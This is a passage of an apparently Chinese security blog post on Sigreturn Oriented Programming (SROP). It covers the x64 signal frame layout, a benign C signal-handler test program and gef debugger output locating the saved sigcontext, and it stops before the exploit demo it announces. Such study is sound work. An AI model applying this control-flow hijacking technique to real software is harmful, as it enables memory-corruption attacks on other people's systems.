<!doctype html>



  


<html class="theme-next mist use-motion">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />












  
  
  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="exp,signal,syscall," />





  <link rel="alternate" href="/atom.xml" title="Asan'world" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />






<meta name="description" content="Sigreturn Oriented Programming，基于 signal mechanism 的内存溢出攻击
缺陷可利用：

进程 context info 及 rt_sigreturn addr 保存在用户进程栈空间，用户进程可读写
内核未判断之前保存的 signal frame 和 恢复时的 signal frame

那么利用思路就很很清晰了，只要控制了用户进程的栈空间，就可以伪造">
<meta property="og:type" content="article">
<meta property="og:title" content="srop 利用方式">
<meta property="og:url" content="https://asanzjx.github.io/2018/10/21/srop_detail/index.html">
<meta property="og:site_name" content="Asan'world">
<meta property="og:description" content="Sigreturn Oriented Programming，基于 signal mechanism 的内存溢出攻击
缺陷可利用：

进程 context info 及 rt_sigreturn addr 保存在用户进程栈空间，用户进程可读写
内核未判断之前保存的 signal frame 和 恢复时的 signal frame

那么利用思路就很很清晰了，只要控制了用户进程的栈空间，就可以伪造">
<meta property="og:image" content="https://asanzjx.github.io/images/signal_k2p.png">
<meta property="og:updated_time" content="2018-10-21T08:04:28.941Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="srop 利用方式">
<meta name="twitter:description" content="Sigreturn Oriented Programming，基于 signal mechanism 的内存溢出攻击
缺陷可利用：

进程 context info 及 rt_sigreturn addr 保存在用户进程栈空间，用户进程可读写
内核未判断之前保存的 signal frame 和 恢复时的 signal frame

那么利用思路就很很清晰了，只要控制了用户进程的栈空间，就可以伪造">
<meta name="twitter:image" content="https://asanzjx.github.io/images/signal_k2p.png">



<script type="text/javascript" id="hexo.configuration">
  var NexT = window.NexT || {};
  var CONFIG = {
    scheme: 'Mist',
    sidebar: {"position":"left","display":"post"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: 0,
      author: '博主'
    }
  };
</script>

  <title> srop 利用方式 | Asan'world </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  










  
  
    
  

  <div class="container one-collumn sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">Asan'world</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle"></p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      

      
    </ul>
  

  
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                srop 利用方式
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2018-10-21T16:00:00+08:00" content="2018-10-21">
              2018-10-21
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/exploit/" itemprop="url" rel="index">
                    <span itemprop="name">exploit</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
                &nbsp; | &nbsp;
                <a href="/2018/10/21/srop_detail/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/10/21/srop_detail/" itemprop="commentsCount"></span>
                </a>
              </span>
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>Sigreturn Oriented Programming，基于 signal mechanism 的内存溢出攻击</p>
<p>缺陷可利用：</p>
<ul>
<li>进程 context info 及 rt_sigreturn addr 保存在用户进程栈空间，用户进程可读写</li>
<li>内核未判断之前保存的 signal frame 和 恢复时的 signal frame</li>
</ul>
<p>那么利用思路就很很清晰了，只要控制了用户进程的栈空间，就可以伪造 signal frame ，劫持控制流</p>
<p>本文简单介绍 srop 中有关 signal 和 debugger signal , syscall 的要点，最后给出一个基于 srop 利用的 x64 simple demo。</p>
<h1><span id="signal-mechanism-下内核与进程的交互">Signal mechanism 下内核与进程的交互</span></h1><p>在进程表的表项中有一个软中断信号域，该域中每一位对应一个信号，当有信号发送给进程时，对应位置位。</p>
<p>进程间的信号是通过内核来转发，A 进程 - 内核 - B 进程，当然进程自己也会触发信号。接下来的讨论是内核收到这个信号的处理流程。</p>
<p><img src="/images/signal_k2p.png" alt="Signal mechanism 下内核与进程的交互"></p>
<p>如上图所述，大概分 4 部分：</p>
<ol>
<li>内核向 B 进程 deliver a signal,该进程响应这个 signal ,暂时挂起 (suspend) , 控制权交给内核</li>
<li>内核为该进程保存相应的 context，跳转到之前注册好的 signal handle 中处理相应的 signal,此时在 user space</li>
<li>当 signal handle 返回之后,内核为该进程恢复保存的上下文</li>
<li>控制权交给 B 进程，恢复执行</li>
</ol>
<p>Signal Frame: 即保存进程 context info 的栈内存空间，x64 布局如下：</p>
<table>
<thead>
<tr>
<th style="text-align:center">Offset</th>
<th style="text-align:center">reg</th>
<th style="text-align:center">reg</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0x00</td>
<td style="text-align:center">rt_sigreturn</td>
<td style="text-align:center">uc_flags</td>
</tr>
<tr>
<td style="text-align:center">0x10</td>
<td style="text-align:center">&amp;uc</td>
<td style="text-align:center">uc_stack.ss_sp</td>
</tr>
<tr>
<td style="text-align:center">0x20</td>
<td style="text-align:center">uc_stack.ss_flags</td>
<td style="text-align:center">uc_stack.ss_size</td>
</tr>
<tr>
<td style="text-align:center">0x30</td>
<td style="text-align:center">r8</td>
<td style="text-align:center">r9</td>
</tr>
<tr>
<td style="text-align:center">0x40</td>
<td style="text-align:center">r10</td>
<td style="text-align:center">r11</td>
</tr>
<tr>
<td style="text-align:center">0x50</td>
<td style="text-align:center">r12</td>
<td style="text-align:center">r13</td>
</tr>
<tr>
<td style="text-align:center">0x60</td>
<td style="text-align:center">r14</td>
<td style="text-align:center">r15</td>
</tr>
<tr>
<td style="text-align:center">0x70</td>
<td style="text-align:center">rdi</td>
<td style="text-align:center">rsi</td>
</tr>
<tr>
<td style="text-align:center">0x80</td>
<td style="text-align:center">rbp</td>
<td style="text-align:center">rbx</td>
</tr>
<tr>
<td style="text-align:center">0x90</td>
<td style="text-align:center">rdx</td>
<td style="text-align:center">rax</td>
</tr>
<tr>
<td style="text-align:center">0xa0</td>
<td style="text-align:center">rcx</td>
<td style="text-align:center">rsp</td>
</tr>
<tr>
<td style="text-align:center">0xb0</td>
<td style="text-align:center">rip</td>
<td style="text-align:center">eflags</td>
</tr>
<tr>
<td style="text-align:center">0xc0</td>
<td style="text-align:center">cs/gs/fs</td>
<td style="text-align:center">err</td>
</tr>
<tr>
<td style="text-align:center">0xd0</td>
<td style="text-align:center">trapno</td>
<td style="text-align:center">oldmask(unused)</td>
</tr>
<tr>
<td style="text-align:center">0xe0</td>
<td style="text-align:center">cr2(segfault addr)</td>
<td style="text-align:center">&amp;fpstate</td>
</tr>
<tr>
<td style="text-align:center">0xf0</td>
<td style="text-align:center">__reserved</td>
<td style="text-align:center">sigmask</td>
</tr>
</tbody>
</table>
<p>详解下第二步，内核会将进程的 context 保存在<strong>进程的内存空间栈上</strong>，然后在栈顶填上一个返回地址: ‘rt_sigreturn()’,这个函数地址指向的就是 ‘sigreturn’ 系统调用（15 号系统调用）。</p>
<h1><span id="debugger-signal-and-find-signal-frame-struct">Debugger signal and find signal frame struct</span></h1><p>调试时，需要对 signal 处理进行设置</p>
<p>系统信号值可通过 kill -l 查阅：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ kill -l</span><br><span class="line"> <span class="number">1</span>) SIGHUP       <span class="number">2</span>) SIGINT       <span class="number">3</span>) SIGQUIT      <span class="number">4</span>) SIGILL       <span class="number">5</span>) SIGTRAP</span><br><span class="line"> <span class="number">6</span>) SIGABRT      <span class="number">7</span>) SIGBUS       <span class="number">8</span>) SIGFPE       <span class="number">9</span>) SIGKILL     <span class="number">10</span>) SIGUSR1</span><br><span class="line"><span class="number">11</span>) SIGSEGV     <span class="number">12</span>) SIGUSR2     <span class="number">13</span>) SIGPIPE     <span class="number">14</span>) SIGALRM     <span class="number">15</span>) SIGTERM</span><br><span class="line"><span class="number">16</span>) SIGSTKFLT   <span class="number">17</span>) SIGCHLD     <span class="number">18</span>) SIGCONT     <span class="number">19</span>) SIGSTOP     <span class="number">20</span>) SIGTSTP</span><br><span class="line"><span class="number">21</span>) SIGTTIN     <span class="number">22</span>) SIGTTOU     <span class="number">23</span>) SIGURG      <span class="number">24</span>) SIGXCPU     <span class="number">25</span>) SIGXFSZ</span><br><span class="line"><span class="number">26</span>) SIGVTALRM   <span class="number">27</span>) SIGPROF     <span class="number">28</span>) SIGWINCH    <span class="number">29</span>) SIGIO       <span class="number">30</span>) SIGPWR</span><br><span class="line"><span class="number">31</span>) SIGSYS      <span class="number">34</span>) SIGRTMIN    <span class="number">35</span>) SIGRTMIN+<span class="number">1</span>  <span class="number">36</span>) SIGRTMIN+<span class="number">2</span>  <span class="number">37</span>) SIGRTMIN+<span class="number">3</span></span><br><span class="line"><span class="number">38</span>) SIGRTMIN+<span class="number">4</span>  <span class="number">39</span>) SIGRTMIN+<span class="number">5</span>  <span class="number">40</span>) SIGRTMIN+<span class="number">6</span>  <span class="number">41</span>) SIGRTMIN+<span class="number">7</span>  <span class="number">42</span>) SIGRTMIN+<span class="number">8</span></span><br><span class="line"><span class="number">43</span>) SIGRTMIN+<span class="number">9</span>  <span class="number">44</span>) SIGRTMIN+<span class="number">10</span> <span class="number">45</span>) SIGRTMIN+<span class="number">11</span> <span class="number">46</span>) SIGRTMIN+<span class="number">12</span> <span class="number">47</span>) SIGRTMIN+<span class="number">13</span></span><br><span class="line"><span class="number">48</span>) SIGRTMIN+<span class="number">14</span> <span class="number">49</span>) SIGRTMIN+<span class="number">15</span> <span class="number">50</span>) SIGRTMAX<span class="number">-14</span> <span class="number">51</span>) SIGRTMAX<span class="number">-13</span> <span class="number">52</span>) SIGRTMAX<span class="number">-12</span></span><br><span class="line"><span class="number">53</span>) SIGRTMAX<span class="number">-11</span> <span class="number">54</span>) SIGRTMAX<span class="number">-10</span> <span class="number">55</span>) SIGRTMAX<span class="number">-9</span>  <span class="number">56</span>) SIGRTMAX<span class="number">-8</span>  <span class="number">57</span>) SIGRTMAX<span class="number">-7</span></span><br><span class="line"><span class="number">58</span>) SIGRTMAX<span class="number">-6</span>  <span class="number">59</span>) SIGRTMAX<span class="number">-5</span>  <span class="number">60</span>) SIGRTMAX<span class="number">-4</span>  <span class="number">61</span>) SIGRTMAX<span class="number">-3</span>  <span class="number">62</span>) SIGRTMAX<span class="number">-2</span></span><br><span class="line"><span class="number">63</span>) SIGRTMAX<span class="number">-1</span>  <span class="number">64</span>) SIGRTMAX</span><br></pre></td></tr></table></figure>
<p>测试代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line"># gcc -o debug_sig ./debug_sig.c -g</span><br><span class="line">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handle_signal</span><span class="params">(<span class="keyword">int</span> signum)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"handling signal: %d\n"</span>, signum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	signal(SIGINT, (<span class="keyword">void</span> *)handle_signal);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"catch me if you can\n"</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>) &#123;&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* struct definition for debugging purpose */</span></span><br><span class="line"><span class="comment">// struct sigcontext sigcontext;</span></span><br></pre></td></tr></table></figure></p>
<p>结合代码 Linux source code about sigcontext struct：<a href="https://elixir.bootlin.com/linux/v4.6/source/arch/x86/include/uapi/asm/sigcontext.h" target="_blank" rel="external">https://elixir.bootlin.com/linux/v4.6/source/arch/x86/include/uapi/asm/sigcontext.h</a></p>
<p>调试过程如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; handle SIGINT pass nostop</span><br><span class="line">Signal        Stop      Print   Pass to program Description</span><br><span class="line">SIGINT        No        Yes     Yes             Interrupt</span><br><span class="line"></span><br><span class="line">gef&gt; b handle_signal</span><br><span class="line"></span><br><span class="line">gef&gt; r</span><br><span class="line">Starting program: ...</span><br><span class="line">catch me if you can</span><br><span class="line"></span><br><span class="line">Ctrl+C</span><br><span class="line">Program received signal SIGINT, Interrupt.</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────[ registers ]────</span><br><span class="line">$rax   : 0x14</span><br><span class="line">$rbx   : 0x0</span><br><span class="line">$rcx   : 0x7fffff3f9b58      →  0x0000000008402210  →  0x0000000000000000</span><br><span class="line">$rdx   : 0x0</span><br><span class="line">$rsp   : 0x7ffffffedbb8      →  0x00007fffff093060  →  &lt;__restore_rt+0&gt; mov rax, 0xf</span><br><span class="line">$rbp   : 0x7ffffffee250      →  0x0000000008000790  →  &lt;__libc_csu_init+0&gt; push r15</span><br><span class="line">$rsi   : 0x0</span><br><span class="line">$rdi   : 0x2</span><br><span class="line">$rip   : 0x8000740           →  &lt;handle_signal+0&gt; push rbp</span><br><span class="line">$r8    : 0x8402000           →  0x0000000000000000</span><br><span class="line">$r9    : 0x0</span><br><span class="line">$r10   : 0x7fffff3f9b58      →  0x0000000008402210  →  0x0000000000000000</span><br><span class="line">$r11   : 0x7fffff3f9b58      →  0x0000000008402210  →  0x0000000000000000</span><br><span class="line">$r12   : 0x8000610           →  &lt;_start+0&gt; xor ebp, ebp</span><br><span class="line">$r13   : 0x7ffffffee330      →  0x0000000000000001</span><br><span class="line">$r14   : 0x0</span><br><span class="line">$r15   : 0x0</span><br><span class="line">$eflags: [carry PARITY adjust zero sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$ds: 0x0000  $es: 0x0000  $cs: 0x0033  $fs: 0x0000  $ss: 0x002b  $gs: 0x0000</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────[ stack ]────</span><br><span class="line">0x00007ffffffedbb8│+0x00: 0x00007fffff093060  →  &lt;__restore_rt+0&gt; mov rax, 0xf  ← $rsp</span><br><span class="line">0x00007ffffffedbc0│+0x08: 0x0000000000000000</span><br><span class="line">0x00007ffffffedbc8│+0x10: 0x0000000000000000</span><br><span class="line">0x00007ffffffedbd0│+0x18: 0x0000000000000000</span><br><span class="line">0x00007ffffffedbd8│+0x20: 0x0000000000000000</span><br><span class="line">0x00007ffffffedbe0│+0x28: 0x0000000000000000</span><br><span class="line">0x00007ffffffedbe8│+0x30: 0x0000000008402000  →  0x0000000000000000</span><br><span class="line">0x00007ffffffedbf0│+0x38: 0x0000000000000000</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────[ code:i386:x86-64 ]────</span><br><span class="line">    0x8000738 &lt;frame_dummy+40&gt; call   rax</span><br><span class="line">    0x800073a &lt;frame_dummy+42&gt; pop    rbp</span><br><span class="line">    0x800073b &lt;frame_dummy+43&gt; jmp    0x8000680 &lt;register_tm_clones&gt;</span><br><span class="line"> →  0x8000740 &lt;handle_signal+0&gt; push   rbp</span><br><span class="line">    0x8000741 &lt;handle_signal+1&gt; mov    rbp, rsp</span><br><span class="line">    0x8000744 &lt;handle_signal+4&gt; sub    rsp, 0x10</span><br><span class="line">    0x8000748 &lt;handle_signal+8&gt; mov    DWORD PTR [rbp-0x4], edi</span><br><span class="line">    0x800074b &lt;handle_signal+11&gt; mov    eax, DWORD PTR [rbp-0x4]</span><br><span class="line">    0x800074e &lt;handle_signal+14&gt; mov    esi, eax</span><br><span class="line">──────────────────────────────────────────────────────────────────────────[ source:./debug_sig.c+9 ]────</span><br><span class="line">      4</span><br><span class="line">      5  #include &lt;stdio.h&gt;</span><br><span class="line">      6  #include &lt;signal.h&gt;</span><br><span class="line">      7</span><br><span class="line">      8  void handle_signal(int signum)</span><br><span class="line"> →    9         &#123;</span><br><span class="line">     10  printf("handling signal: %d\n", signum);</span><br><span class="line">     11  &#125;</span><br><span class="line">     12</span><br><span class="line">     13  int main()&#123;</span><br><span class="line">     14      signal(SIGINT, (void *)handle_signal);</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────[ threads ]────</span><br><span class="line">[#0] Id 1, Name: "debug_sig", stopped, reason: BREAKPOINT</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────[ trace ]────</span><br><span class="line">[#0] 0x8000740 → Name: handle_signal(signum=0x0)</span><br><span class="line">[#1] 0x7fffff093060 → Name: __restore_rt()</span><br><span class="line">[#2] 0x8000785 → Name: main()</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"></span><br><span class="line">Breakpoint 3, handle_signal (signum=0x0) at ./debug_sig.c:9</span><br><span class="line">9       &#123;</span><br><span class="line"></span><br><span class="line">gef➤  p (struct sigcontext)*(0x00007ffffffedbb8+0x30)</span><br><span class="line">$5 = &#123;</span><br><span class="line">  r8 = 0x8402000,</span><br><span class="line">  r9 = 0x0,</span><br><span class="line">  r10 = 0x7fffff3f9b58,</span><br><span class="line">  r11 = 0x7fffff3f9b58,</span><br><span class="line">  r12 = 0x8000610,</span><br><span class="line">  r13 = 0x7ffffffee330,</span><br><span class="line">  r14 = 0x0,</span><br><span class="line">  r15 = 0x0,</span><br><span class="line">  rdi = 0x0,</span><br><span class="line">  rsi = 0x8402010,</span><br><span class="line">  rbp = 0x7ffffffee250,</span><br><span class="line">  rbx = 0x0,</span><br><span class="line">  rdx = 0x7fffff3fb760,</span><br><span class="line">  rax = 0x14,</span><br><span class="line">  rcx = 0x7fffff3f9b58,</span><br><span class="line">  rsp = 0x7ffffffee250,</span><br><span class="line">  rip = 0x8000785,</span><br><span class="line">  eflags = 0x206,</span><br><span class="line">  cs = 0x33,</span><br><span class="line">  gs = 0x2b,</span><br><span class="line">  fs = 0x53,</span><br><span class="line">  __pad0 = 0x0,</span><br><span class="line">  err = 0x0,</span><br><span class="line">  trapno = 0x0,</span><br><span class="line">  oldmask = 0x0,</span><br><span class="line">  cr2 = 0x0,</span><br><span class="line">  &#123;</span><br><span class="line">    fpstate = 0x0,</span><br><span class="line">    __fpstate_word = 0x0</span><br><span class="line">  &#125;,</span><br><span class="line">  __reserved1 = &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的寄存器值与当前上下文稍有出入，是因为调用 handler_signal() 函数传参等修改寄存器所致。</p>
<p>还可以观察 ucontext-&gt;uc_mcontext-&gt;greps 字段，这个也会与 sigcontext 结构体数据一致。也就是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; p (<span class="keyword">struct</span> ucontext)*<span class="number">0x00007ffffffedbb8</span></span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; b *0x8000763</span><br><span class="line">gef&gt; c</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────[ registers ]────</span><br><span class="line">$rax   : 0x13</span><br><span class="line">$rbx   : 0x0</span><br><span class="line">$rcx   : 0x7fffffed</span><br><span class="line">$rdx   : 0x7fffff3fb760      →  0x0000000000000000</span><br><span class="line">$rsp   : 0x7ffffffedbb8      →  0x00007fffff093060  →  &lt;__restore_rt+0&gt; mov rax, 0xf</span><br><span class="line">$rbp   : 0x7ffffffee250      →  0x0000000008000790  →  &lt;__libc_csu_init+0&gt; push r15</span><br><span class="line">$rsi   : 0x8402010           →  "handling signal: 2"</span><br><span class="line">$rdi   : 0x0</span><br><span class="line">$rip   : 0x8000763           →  &lt;handle_signal+35&gt; ret</span><br><span class="line">$r8    : 0x1</span><br><span class="line">$r9    : 0x13</span><br><span class="line">$r10   : 0x64</span><br><span class="line">$r11   : 0x64</span><br><span class="line">$r12   : 0x8000610           →  &lt;_start+0&gt; xor ebp, ebp</span><br><span class="line">$r13   : 0x7ffffffee330      →  0x0000000000000001</span><br><span class="line">$r14   : 0x0</span><br><span class="line">$r15   : 0x0</span><br><span class="line">$eflags: [carry parity adjust zero sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$ds: 0x0000  $es: 0x0000  $cs: 0x0033  $fs: 0x0000  $ss: 0x002b  $gs: 0x0000</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────[ stack ]────</span><br><span class="line">0x00007ffffffedbb8│+0x00: 0x00007fffff093060  →  &lt;__restore_rt+0&gt; mov rax, 0xf  ← $rsp</span><br><span class="line">0x00007ffffffedbc0│+0x08: 0x0000000000000000</span><br><span class="line">0x00007ffffffedbc8│+0x10: 0x0000000000000000</span><br><span class="line">0x00007ffffffedbd0│+0x18: 0x0000000000000000</span><br><span class="line">0x00007ffffffedbd8│+0x20: 0x0000000000000000</span><br><span class="line">0x00007ffffffedbe0│+0x28: 0x0000000000000000</span><br><span class="line">0x00007ffffffedbe8│+0x30: 0x0000000008402000  →  0x0000000000000000</span><br><span class="line">0x00007ffffffedbf0│+0x38: 0x0000000000000000</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────[ code:i386:x86-64 ]────</span><br><span class="line">    0x800075c &lt;handle_signal+28&gt; call   0x80005e0 &lt;printf@plt&gt;</span><br><span class="line">    0x8000761 &lt;handle_signal+33&gt; nop</span><br><span class="line">    0x8000762 &lt;handle_signal+34&gt; leave</span><br><span class="line"> →  0x8000763 &lt;handle_signal+35&gt; ret</span><br><span class="line">   ↳  0x7fffff093060 &lt;__restore_rt+0&gt; mov    rax, 0xf</span><br><span class="line">      0x7fffff093067 &lt;__restore_rt+7&gt; syscall</span><br><span class="line">      0x7fffff093069 &lt;__restore_rt+9&gt; nop    DWORD PTR [rax+0x0]</span><br><span class="line">      0x7fffff093070 &lt;__libc_sigaction+0&gt; sub    rsp, 0xd0</span><br><span class="line">      0x7fffff093077 &lt;__libc_sigaction+7&gt; test   rsi, 